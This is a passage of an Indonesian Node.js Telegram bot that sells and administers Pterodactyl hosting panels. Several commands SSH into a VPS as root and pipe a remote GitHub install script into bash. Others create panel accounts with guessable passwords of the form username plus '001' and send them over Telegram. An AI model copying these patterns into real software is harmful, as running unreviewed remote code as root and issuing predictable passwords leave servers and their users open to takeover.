        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${domainnode}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        console.log('STDOUT: ' + data);
    }


    function handleNodeCreationInput(data, stream, domainnode, ramvps) {
                stream.write('RuztanXD\n'); //ini gk ush di ubah gblk
        stream.write('4\n');
        stream.write('LOCATION\n');
        stream.write('Jangan Lupa Sholat\n');
        stream.write(`${domainnode}\n`);
        stream.write('NODES\n');
        stream.write(`${ramvps}\n`);
        stream.write(`${ramvps}\n`);
        stream.write('1\n');
        console.log('STDOUT: ' + data);
    }
  } else {
      bot.sendMessage(chatId, 'Fitur Ini Khusus Owner Saya!!!');
    }
});
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

// START WINGS PANEL
bot.onText(/^(\.|\#|\/)startwings$/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `Format salah!\nPenggunaan: /startwings ipvps,password,token\nOWNER @hitsssh`);
  });
bot.onText(/\/startwings (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  const t = text.split(',');
  if (settings.adminId.includes(String(msg.from.id))) {
  if (t.length < 3) {
    return bot.sendMessage(chatId, 'Format salah!\nPenggunaan: /startwings ipvps,password,token\nOWNER @hitsssh');
  }
  const ipvps = t[0];
  const passwd = t[1];
  const token = t[2];
  const connSettings = {
    host: ipvps,
    port: 22,
    username: 'root',
    password: passwd
  };
    const conn = new Client();
    const command = 'bash <(curl https://raw.githubusercontent.com/RuztanHosting/RuzPrivat/main/install.sh)'
 
    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        sendMessage(chatId,' PROSES CONFIGURE WINGS\nscript by @hitsssh')
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ${code} and ${signal} signal');
         sendMessage(chatId, 'SUCCES START WINGS DI PANEL ANDA COBA CEK PASTI IJO😁\nscript by @hitsssh');
                conn.end();
            }).on('data', (data) => {
            stream.write('RuztanXD\n');
                stream.write('3\n');
                stream.write(`${token}\n`)
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        sendMessage(chatId, 'Katasandi atau IP tidak valid');
    }).connect(connSettings);
     } else {
      bot.sendMessage(chatId, 'Fitur Ini Khusus Owner Saya!!!');
    }
});
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

// UNINSTALL PANEL
bot.onText(/^(\.|\#|\/)uninstallpanel$/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `Format salah!\nPenggunaan: /uninstallpanel ipvps,password\nOWNER @hitsssh`);
  });
bot.onText(/\/uninstallpanel (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  const t = text.split(',');
  if (settings.adminId.includes(String(msg.from.id))) {
  if (t.length < 2) {
    return bot.sendMessage(chatId, 'Format salah!\nPenggunaan: /uninstallpanel ipvps,password\nOWNER @hitsssh');
  }
  const ipvps = t[0];
  const passwd = t[1];
  const connSettings = {
    host: ipvps,
    port: 22,
    username: 'root',
    password: passwd
  };
    const conn = new Client();
    const command = 'bash <(curl https://raw.githubusercontent.com/RuztanHosting/RuzPrivat/main/install.sh)'
 
    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        sendMessage(chatId,'PROSES UNINSTALLPANEL\nBy @hitsssh')
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ${code} and ${signal} signal');
         sendMessage(chatId, 'CEK OM UDAH MOKAD BELUM?\nBy @hitsssh');
                conn.end();
            }).on('data', (data) => {
            stream.write('RuztanXD\n');
                stream.write('5\n');
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        sendMessage(chatId, 'Katasandi atau IP tidak valid');
    }).connect(connSettings);
     } else {
      bot.sendMessage(chatId, 'Fitur Ini Khusus Owner Saya!!!');
    }
});
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

// UNINSTALL THEMA
bot.onText(/^(\.|\#|\/)uninstallthema$/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `Format salah!\nPenggunaan: /uninstallthema ipvps,password\nOWNER @hitsssh`);
  });
bot.onText(/\/uninstallthema (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  const t = text.split(',');
  if (settings.adminId.includes(String(msg.from.id))) {
  if (t.length < 2) {
    return bot.sendMessage(chatId, 'Format salah!\nPenggunaan: /uninstallthema ipvps,password\nOWNER @hitsssh');
  }
  const ipvps = t[0];
  const passwd = t[1];
  const connSettings = {
    host: ipvps,
    port: 22,
    username: 'root',
    password: passwd
  };
    const conn = new Client();
    const command = 'bash <(curl https://raw.githubusercontent.com/RuztanHosting/RuzPrivat/main/install.sh)'
 
    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        sendMessage(chatId,'PROSES UNINSTALLTHEMA\nBy @hitsssh')
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ${code} and ${signal} signal');
         sendMessage(chatId, 'CEK OM UDAH MOKAD BELUM?\nBy @hitsssh');
                conn.end();
            }).on('data', (data) => {
                stream.write('RuztanXD\n');
                stream.write('2\n');
                stream.write('y\n');
                stream.write('yes\n');
                stream.write('x\n');
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        sendMessage(chatId, 'Katasandi atau IP tidak valid');
    }).connect(connSettings);
     } else {
      bot.sendMessage(chatId, 'Fitur Ini Khusus Owner Saya!!!');
    }
});
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

// INSTALL THEMA INSTELLAR
bot.onText(/^(\.|\#|\/)tema1$/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `Format salah!\nPenggunaan: /tema1 ipvps,password\nOWNER @hitsssh`);
  });
bot.onText(/\/tema1 (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  const t = text.split(',');
  if (settings.adminId.includes(String(msg.from.id))) {
  if (t.length < 2) {
    return bot.sendMessage(chatId, 'Format salah!\nPenggunaan: /tema1 ipvps,password\nOWNER @hitsssh');
  }
  const ipvps = t[0];
  const passwd = t[1];
  const connSettings = {
    host: ipvps,
    port: 22,
    username: 'root',
    password: passwd
  };
    const conn = new Client();
    const command = 'bash <(curl https://raw.githubusercontent.com/RuztanHosting/RuzPrivat/main/install.sh)'
 
    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        sendMessage(chatId,'PROSES INSTALL THEMA OM\nBy @hitsssh')
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ${code} and ${signal} signal');
         sendMessage(chatId, 'CEK OM UDAH KE INSTALL BELUM TEMANYA?\nBy @hitsssh');
                conn.end();
            }).on('data', (data) => {
stream.write('RuztanXD\n');
                stream.write('1\n');
                stream.write('1\n');
                stream.write('y\n');
                stream.write('x\n');
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        sendMessage(chatId, 'Katasandi atau IP tidak valid');
    }).connect(connSettings);
     } else {
      bot.sendMessage(chatId, 'Fitur Ini Khusus Owner Saya!!!');
    }
});
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//===================MENU CPANEL===≈====≈============//
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// addprem
bot.onText(/\/addprem (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = match[1];
    
    if (msg.from.id.toString() === owner) {
        if (!premiumUsers.includes(userId)) {
            premiumUsers.push(userId);
            fs.writeFileSync(premiumUsersFile, JSON.stringify(premiumUsers));
            bot.sendMessage(chatId, `User ${userId} has been added to premium users.`);
        } else {
            bot.sendMessage(chatId, `User ${userId} is already a premium user.`);
        }
    } else {
        bot.sendMessage(chatId, 'Only the owner can perform this action.');
    }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// cekid
bot.onText(/\/cekid/, (msg) => {
    const chatId = msg.chat.id;
    const sender = msg.from.username;
    const id = msg.from.id;
    const owner = '6350764506'; // Ganti dengan ID pemilik bot 
    const text12 = `Hi @${sender} 👋
    
👤 From ${id}
  └🙋🏽 kamu
  
 ID Telegram Anda: ${id}
 Full Name Anda : @${sender}

🙏🏼 Permisi, bot akan pergi secara otomatis.
 Developer : @hitsssh`;
    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'Testimoni', url: 'https://t.me/ruztan_host' }, { text: 'List Produk Lainnya', url: 'https://t.me/hitsssh' }],
                [{ text: 'List Murid Unban & Banned', url: 'https://t.me/hitsssh' }]
            ]
        }
    };
    bot.sendPhoto(chatId, settings.pp, { caption: text12, parse_mode: 'Markdown', reply_markup: keyboard });
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// delprem
bot.onText(/\/delprem (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = match[1];  
    if (msg.from.id.toString() === owner) {
        const index = premiumUsers.indexOf(userId);
        if (index !== -1) {
            premiumUsers.splice(index, 1);
            fs.writeFileSync(premiumUsersFile, JSON.stringify(premiumUsers));
            bot.sendMessage(chatId, `User ${userId} has been removed from premium users.`);
        } else {
            bot.sendMessage(chatId, `User ${userId} is not a premium user.`);
        }
    } else {
        bot.sendMessage(chatId, 'Only the owner can perform this action.');
    }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// addowner
bot.onText(/\/addowner (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = match[1];
    
    if (msg.from.id.toString() === owner) {
        if (!adminUsers.includes(userId)) {
            adminUsers.push(userId);
            fs.writeFileSync(adminfile, JSON.stringify(adminUsers));
            bot.sendMessage(chatId, `User ${userId} has been added to admin users.`);
        } else {
            bot.sendMessage(chatId, `User ${userId} is already an admin user.`);
        }
    } else {
        bot.sendMessage(chatId, 'Only the owner can perform this action.');
    }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// delowner
bot.onText(/\/delowner (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = match[1];
    
    if (msg.from.id.toString() === owner) {
        const index = adminUsers.indexOf(userId);
        if (index !== -1) {
            adminUsers.splice(index, 1);
            fs.writeFileSync(adminfile, JSON.stringify(adminUsers));
            bot.sendMessage(chatId, `User ${userId} has been removed from admin users.`);
        } else {
            bot.sendMessage(chatId, `User ${userId} is not an admin user.`);
        }
    } else {
        bot.sendMessage(chatId, 'Only the owner can perform this action.');
    }
});

bot.onText(/\/1gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));
  if (!isPremium) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/hitsssh' }
          ]
        ]
      }
    });
    return;
  }
  const t = text.split(',');
  if (t.length < 2) {
    bot.sendMessage(chatId, 'Invalid format. Usage: /1gb namapanel,idtele');
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + '1gb';
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = '1024';
  const cpu = '30';
  const disk = '1024';
  const spc = 'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.san`;
  const akunlo = settings.pp;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: 'en',
        password: password
      })
    });
    const data = await response.json();
    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name: name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
        startup: spc,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(chatId, `BERIKUT DATA PANEL ANDA
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%`);

    if (akunlo) {
    
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

HERE'S YOUR PANEL DATA ⤵️
🚩 Login : ${domain}
🚩 Username : ${user.username}
🚩 Password : ${password} 
==============================
Jangan Lupa Bilang Done Jika Sudah Di Cek

#CARA UP SC DI PANEL
https://youtu.be/DzbJZyTj5KY?si=HUS_nCXLiopRyjiW
==============================
CREATE PANEL BY hitsssh😁✌️`
        });
      bot.sendMessage(chatId, 'Data panel berhasil dikirim ke ID Telegram yang dimaksud.');
    }
  } else {
    bot.sendMessage(chatId, 'Gagal membuat data panel. Silakan coba lagi.');
  }
});
// 2gb
bot.onText(/\/2gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));  
  if (!isPremium) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/hitsssh' }
          ]
        ]
      }
    });
    return;
  }
  const t = text.split(',');
  if (t.length < 2) {
    bot.sendMessage(chatId, 'Invalid format. Usage: /2gb namapanel,idtele');
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + '2gb';
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = '2048';
  const cpu = '60';
  const disk = '2048';
  const spc = 'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}_${u}@buyer.san`;
  const akunlo = settings.pp;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: 'en',
        password: password
      })
    });
    const data = await response.json();
    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name: name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
        startup: spc,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(chatId, `BERIKUT DATA PANEL ANDA
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%`);
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

HERE'S YOUR PANEL DATA ⤵️
🚩 Login : ${domain}
🚩 Username : ${user.username}
🚩 Password : ${password} 
==============================
Jangan Lupa Bilang Done Jika Sudah Di Cek

#CARA UP SC DI PANEL
https://youtu.be/DzbJZyTj5KY?si=HUS_nCXLiopRyjiW
==============================
CREATE PANEL BY hitsssh😁✌️`
        });
      bot.sendMessage(chatId, 'Data panel berhasil dikirim ke ID Telegram yang dimaksud.');
    }
  } else {
    bot.sendMessage(chatId, 'Gagal membuat data panel. Silakan coba lagi.');
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 3gb
// 3gb
bot.onText(/\/3gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id)); 
  if (!isPremium) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: '@hitsssh' }
          ]
        ]
      }
    });
    return;
  }
  const t = text.split(',');
  if (t.length < 2) {
    bot.sendMessage(chatId, 'Invalid format. Usage: /3gb namapanel,idtele');
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + '3gb';
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = '3072';
  const cpu = '90';
  const disk = '3072';
  const spc = 'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.san`;
  const akunlo = settings.pp;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: 'en',
        password: password
      })
    });
    const data = await response.json();
    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name: name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
        startup: spc,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(chatId, `BERIKUT DATA PANEL ANDA
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%`);

    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

HERE'S YOUR PANEL DATA ⤵️
🚩 Login : ${domain}
🚩 Username : ${user.username}
🚩 Password : ${password} 
==============================
Jangan Lupa Bilang Done Jika Sudah Di Cek

#CARA UP SC DI PANEL
https://youtu.be/DzbJZyTj5KY?si=HUS_nCXLiopRyjiW
==============================
CREATE PANEL BY hitsssh😁✌️`
        });
      bot.sendMessage(chatId, 'Data panel berhasil dikirim ke ID Telegram yang dimaksud.');
    }
  } else {
    bot.sendMessage(chatId, 'Gagal membuat data panel. Silakan coba lagi.');
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 4gb
bot.onText(/\/4gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));  
  if (!isPremium) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: '@hitsssh' }
          ]
        ]
      }
    });
    return;
  }
  const t = text.split(',');
  if (t.length < 2) {
    bot.sendMessage(chatId, 'Invalid format. Usage: /4gb namapanel,idtele');
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + '4gb';
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = '4048';
  const cpu = '110';
  const disk = '4048';
  const spc = 'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.san`;
  const akunlo = settings.pp;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: 'en',
        password: password
      })
    });
    const data = await response.json();
    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name: name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
        startup: spc,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(chatId, `BERIKUT DATA PANEL ANDA
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%`);
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

HERE'S YOUR PANEL DATA ⤵️
🚩 Login : ${domain}
🚩 Username : ${user.username}
🚩 Password : ${password} 
==============================
Jangan Lupa Bilang Done Jika Sudah Di Cek

#CARA UP SC DI PANEL
https://youtu.be/DzbJZyTj5KY?si=HUS_nCXLiopRyjiW
==============================
CREATE PANEL BY hitsssh😁✌️`
        });
      bot.sendMessage(chatId, 'Data panel berhasil dikirim ke ID Telegram yang dimaksud.');
    }
  } else {
    bot.sendMessage(chatId, 'Gagal membuat data panel. Silakan coba lagi.');
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 5gb
bot.onText(/\/5gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));  
  if (!isPremium) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/hitsssh' }
          ]
        ]
      }
    });
    return;
  }
  const t = text.split(',');
  if (t.length < 2) {
    bot.sendMessage(chatId, 'Invalid format. Usage: /5gb namapanel,idtele');
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + '5gb';
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = '5048';
  const cpu = '140';
  const disk = '5048';
  const spc = 'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.san`;
  const akunlo = settings.pp;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: 'en',
        password: password
      })
    });
    const data = await response.json();
    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name: name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
        startup: spc,
